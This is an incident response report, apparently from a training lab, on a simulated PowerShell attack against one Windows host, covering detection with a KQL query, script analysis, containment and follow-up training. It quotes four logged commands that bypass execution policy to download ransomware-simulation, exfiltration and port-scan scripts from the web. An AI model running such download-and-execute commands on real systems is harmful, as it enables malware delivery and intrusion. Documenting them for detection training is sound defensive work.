# Incident Response Notes

### Detection and Analysis

* The incident **“J - PowerShell Suspicious Web Request”** was triggered on a single device (`windows-target-1`) by one user.
* During the incident, **four different PowerShell scripts** were downloaded and executed via separate commands:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
```

* Upon contacting the user, they reported attempting to install free software but experienced only a black screen with no further visible activity.

* Further investigation using **Microsoft Defender for Endpoint** confirmed execution of the scripts. The following KQL query was used to verify the PowerShell activity:

```kql
let TargetHostname = "windows-target-1"; 
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); 
DeviceProcessEvents
| where DeviceName == TargetHostname 
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

* The scripts were forwarded to the malware reverse engineering team, who summarized their functionality as follows:

  * **pwncrypt.ps1**: Simulates ransomware by creating fake sensitive files, encrypting them with AES, and placing ransom notes on a user’s Desktop, including logging and cleanup.

  * **exfiltratedata.ps1**: Simulates data exfiltration by generating fake employee data, compressing it, uploading to Azure Blob Storage, and logging all steps.

  * **portscan.ps1**: Performs sequential ping sweeps and port scans on a subnet, logging open/closed status of common ports for live hosts.

  * **eicar.ps1**: Generates the standard EICAR antivirus test file to simulate malware detection events.

---

### Containment, Eradication, and Recovery

* The affected machine was immediately isolated.
* A full antivirus scan was conducted using Microsoft Defender for Endpoint.
* After the scan returned clean, the machine was removed from isolation and restored to normal operation.

---

### Post-Incident Activities

* The user involved completed a cybersecurity awareness training session.
* The organization upgraded its Cyber Awareness training package (KnowBe4) and increased the frequency of mandatory training for all employees.
* Initiated implementation of a new policy restricting PowerShell usage to essential personnel only.
